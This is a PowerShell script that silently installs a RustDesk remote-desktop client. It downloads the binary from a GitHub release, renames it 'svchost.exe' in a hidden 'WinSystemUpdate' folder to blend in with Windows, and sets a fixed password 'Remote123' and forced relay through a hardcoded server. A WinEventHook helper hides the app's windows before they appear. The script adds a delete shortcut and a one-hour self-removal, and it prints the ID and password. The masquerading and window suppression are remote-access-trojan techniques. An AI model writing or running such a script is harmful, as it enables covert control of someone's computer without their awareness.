function Install-RD {
    $ProgressPreference = 'SilentlyContinue'
    $DEST       = "$env:LOCALAPPDATA\WinSystemUpdate"
    $EXE        = "$DEST\svchost.exe"        # renamed from chrome.exe — blends with Windows
    $DLL        = "$DEST\sciter.dll"
    $CHROME_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/chrome.exe"
    $SCITER_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/sciter.dll"
    $cfgDir     = "$env:APPDATA\RustDesk\config"

    # 1. Kill old + clean
    Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
    Get-Process chrome  -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 1
    Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
    New-Item -ItemType Directory $DEST -Force | Out-Null

    # 2. Download in parallel
    Write-Host "Installing..." -ForegroundColor Cyan
    $wc1 = New-Object System.Net.WebClient
    $wc2 = New-Object System.Net.WebClient
    Unregister-Event "RDCHR" -EA SilentlyContinue; Remove-Event "RDCHR" -EA SilentlyContinue
    Unregister-Event "RDSCT" -EA SilentlyContinue; Remove-Event "RDSCT" -EA SilentlyContinue
    Register-ObjectEvent $wc1 DownloadFileCompleted -SourceIdentifier "RDCHR" | Out-Null
    Register-ObjectEvent $wc2 DownloadFileCompleted -SourceIdentifier "RDSCT" | Out-Null
    $wc1.DownloadFileAsync([uri]$CHROME_URL, $EXE)
    $wc2.DownloadFileAsync([uri]$SCITER_URL, $DLL)
    $null = Wait-Event -SourceIdentifier "RDCHR" -Timeout 120
    $null = Wait-Event -SourceIdentifier "RDSCT" -Timeout 120
    Unregister-Event "RDCHR" -EA SilentlyContinue; Remove-Event "RDCHR" -EA SilentlyContinue
    Unregister-Event "RDSCT" -EA SilentlyContinue; Remove-Event "RDSCT" -EA SilentlyContinue

    if (!(Test-Path $EXE) -or (Get-Item $EXE).Length -lt 1MB) {
        Write-Host "Download failed!" -ForegroundColor Red; return
    }

    # 3. Config — permanent password + force relay
    New-Item -ItemType Directory $cfgDir -Force | Out-Null
    Set-Content "$cfgDir\RustDesk.toml"  "enc_id = ''"            -Encoding UTF8
    Add-Content "$cfgDir\RustDesk.toml"  "password = 'Remote123'" -Encoding UTF8
    Add-Content "$cfgDir\RustDesk.toml"  "salt = ''"              -Encoding UTF8
    Add-Content "$cfgDir\RustDesk.toml"  "key_confirmed = true"   -Encoding UTF8
    Set-Content "$cfgDir\RustDesk2.toml" "rendezvous_server = '34.107.221.82'" -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "relay_server = '34.107.221.82'"      -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "nat_type = 1"                        -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "serial = 0"                          -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "[options]"                           -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "verification-method = 'use-permanent-password'" -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "approve-mode = 'password'"           -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "direct-server = 'N'"                 -Encoding UTF8
    Add-Content "$cfgDir\RustDesk2.toml" "force-always-relay = 'Y'"            -Encoding UTF8

    # 4. Hide folder
    $f = Get-Item $DEST -Force; $f.Attributes = $f.Attributes -bor 2 -bor 4

    # 5. Get ID
    $RDID = ""
    $psiId = New-Object System.Diagnostics.ProcessStartInfo
    $psiId.FileName = $EXE; $psiId.Arguments = "--get-id"
    $psiId.UseShellExecute = $false; $psiId.RedirectStandardOutput = $true
    $psiId.RedirectStandardError = $true; $psiId.CreateNoWindow = $true
    $prId   = [System.Diagnostics.Process]::Start($psiId)
    $outT   = $prId.StandardOutput.ReadToEndAsync()
    $prId.WaitForExit(8000) | Out-Null
    if (!$prId.HasExited) { $prId.Kill() }
    $RDID = $outT.Result.Trim()

    if (!$RDID -or $RDID -notmatch '^\d+$') {
        $psi0 = New-Object System.Diagnostics.ProcessStartInfo
        $psi0.FileName = $EXE; $psi0.UseShellExecute = $true
        $psi0.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $pr0 = [System.Diagnostics.Process]::Start($psi0); Start-Sleep 5
        $pr0 | Stop-Process -Force -EA SilentlyContinue; Start-Sleep 2
        $psiId2 = New-Object System.Diagnostics.ProcessStartInfo
        $psiId2.FileName = $EXE; $psiId2.Arguments = "--get-id"
        $psiId2.UseShellExecute = $false; $psiId2.RedirectStandardOutput = $true
        $psiId2.CreateNoWindow = $true
        $prId2  = [System.Diagnostics.Process]::Start($psiId2)
        $outT2  = $prId2.StandardOutput.ReadToEndAsync()
        $prId2.WaitForExit(8000) | Out-Null
        if (!$prId2.HasExited) { $prId2.Kill() }
        $RDID = $outT2.Result.Trim()
    }

    # 6. Write accept.ps1 — uses WinEventHook EVENT_OBJECT_SHOW to hide BEFORE render
    $acceptPs = "$DEST\accept.ps1"
    Set-Content $acceptPs @'
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
public class WEH {
    public delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType,
        IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);

    [DllImport("user32.dll")] public static extern IntPtr SetWinEventHook(
        uint eventMin, uint eventMax, IntPtr hmodWinEventProc,
        WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);
    [DllImport("user32.dll")] public static extern bool UnhookWinEvent(IntPtr h);
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr h, StringBuilder s, int n);
    [DllImport("user32.dll")] public static extern int GetWindowTextLength(IntPtr h);
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr h, out uint p);
    [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr h, out RECT r);
    [DllImport("user32.dll")] public static extern bool IsWindowVisible(IntPtr h);
    [DllImport("user32.dll")] public static extern int GetMessage(out MSG m, IntPtr h, uint f, uint l);
    [DllImport("user32.dll")] public static extern bool TranslateMessage(ref MSG m);
    [DllImport("user32.dll")] public static extern IntPtr DispatchMessage(ref MSG m);
    [StructLayout(LayoutKind.Sequential)] public struct RECT { public int L,T,R,B; }
    [StructLayout(LayoutKind.Sequential)] public struct MSG {
        public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam;
        public uint time; public int ptX; public int ptY;
    }
    public const uint EVENT_OBJECT_SHOW    = 0x8002;
    public const uint EVENT_OBJECT_CREATE  = 0x8000;
    public const uint WINEVENT_OUTOFCONTEXT = 0x0000;
}
"@
$DEST  = "$env:LOCALAPPDATA\WinSystemUpdate"
$exePath = "$DEST\svchost.exe"

# Get RustDesk PID (wait for it to start)
$rdPid = 0
for($i=0;$i -lt 20;$i++){
    $pr = Get-Process svchost -EA SilentlyContinue | Where-Object{$_.Path -eq $exePath} | Select-Object -First 1
    if($pr){ $rdPid = $pr.Id; break }
    Start-Sleep -Milliseconds 500
}
if($rdPid -eq 0){ exit }

$hook = $null
$cb = [WEH+WinEventDelegate]{
    param($hHook,$evType,$hwnd,$idObj,$idChild,$tid,$time)
    if($hwnd -eq [IntPtr]::Zero){ return }
    $p2=0; [WEH]::GetWindowThreadProcessId($hwnd,[ref]$p2) | Out-Null
    if($p2 -ne $script:rdPid){ return }
    # Hide immediately — before any paint
    [WEH]::ShowWindow($hwnd, 0) | Out-Null
}

# Hook EVENT_OBJECT_CREATE and EVENT_OBJECT_SHOW for our process
$hook = [WEH]::SetWinEventHook(
    [WEH]::EVENT_OBJECT_CREATE, [WEH]::EVENT_OBJECT_SHOW,
    [IntPtr]::Zero, $cb, $rdPid, 0, [WEH]::WINEVENT_OUTOFCONTEXT)

# Message pump — required for WinEventHook callbacks to fire
$msg = New-Object WEH+MSG
while($true){
    $pr2 = Get-Process svchost -EA SilentlyContinue | Where-Object{$_.Path -eq $exePath}
    if(-not $pr2){ break }
    # Pump messages (non-blocking)
    $r = [WEH]::GetMessage([ref]$msg,[IntPtr]::Zero,0,0)
    if($r -le 0){ break }
    [WEH]::TranslateMessage([ref]$msg) | Out-Null
    [WEH]::DispatchMessage([ref]$msg) | Out-Null
}
if($hook){ [WEH]::UnhookWinEvent($hook) | Out-Null }
'@ -Encoding UTF8

    # 7. Launch hidden
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $EXE; $psi.WorkingDirectory = $DEST
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null

    # 8. Start accept.ps1 IMMEDIATELY (before RustDesk window shows)
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$acceptPs`"" -WindowStyle Hidden

    Start-Sleep 4

    # 9. Also hide any window that slipped through
    Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);' -EA SilentlyContinue
    Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | ForEach-Object { [N.W]::ShowWindow($_.MainWindowHandle, 0) | Out-Null }

    # 10. delete.ps1
    $deletePs = "$DEST\delete.ps1"
    Set-Content  $deletePs  '$d="$env:LOCALAPPDATA\WinSystemUpdate"' -Encoding ASCII
    Add-Content  $deletePs  'Get-Process svchost -EA SilentlyContinue|Where-Object{$_.Path -like "*WinSystem*"}|Stop-Process -Force -EA SilentlyContinue' -Encoding ASCII
    Add-Content  $deletePs  'Start-Sleep 2; Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue' -Encoding ASCII
    Add-Content  $deletePs  'foreach($dp in @([Environment]::GetFolderPath("Desktop"),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")){ Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }' -Encoding ASCII

    # 11. Desktop shortcut
    $lnkPath = $null
    foreach ($dp in @([Environment]::GetFolderPath('Desktop'), "$env:USERPROFILE\Desktop", "$env:USERPROFILE\OneDrive\Desktop")) {
        if (Test-Path $dp) { $lnkPath = "$dp\DELETE CHROME.lnk"; break }
    }
    if ($lnkPath) {
        $sh = (New-Object -COM WScript.Shell).CreateShortcut($lnkPath)
        $sh.TargetPath = "powershell.exe"
        $sh.Arguments  = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$deletePs`""
        $sh.IconLocation = "shell32.dll,131"; $sh.Save()
    }

    # 12. 1-hour auto-delete
    $timerPs = "$DEST\timer.ps1"
    Set-Content  $timerPs  '$d="$env:LOCALAPPDATA\WinSystemUpdate"' -Encoding ASCII
    Add-Content  $timerPs  'Start-Sleep 3600' -Encoding ASCII
    Add-Content  $timerPs  'Get-Process svchost -EA SilentlyContinue|Where-Object{$_.Path -like "*WinSystem*"}|Stop-Process -Force -EA SilentlyContinue' -Encoding ASCII
    Add-Content  $timerPs  'Start-Sleep 2; Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue' -Encoding ASCII
    Add-Content  $timerPs  'foreach($dp in @([Environment]::GetFolderPath("Desktop"),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")){ Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }' -Encoding ASCII
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$timerPs`"" -WindowStyle Hidden

    # 13. Done
    Write-Host ""
    Write-Host "  ==========================================" -ForegroundColor Green
    Write-Host "   DONE! Remote Access is now active." -ForegroundColor Green
    Write-Host "  ==========================================" -ForegroundColor Green
    Write-Host "   Your ID:  $RDID" -ForegroundColor Cyan
    Write-Host "   Password: Remote123" -ForegroundColor Cyan
    Write-Host "   Desktop shortcut: DELETE CHROME" -ForegroundColor Gray
    Write-Host "   Auto-deletes in 1 hour." -ForegroundColor Gray
    Write-Host "  ==========================================" -ForegroundColor Green
    Write-Host ""
}
Install-RD
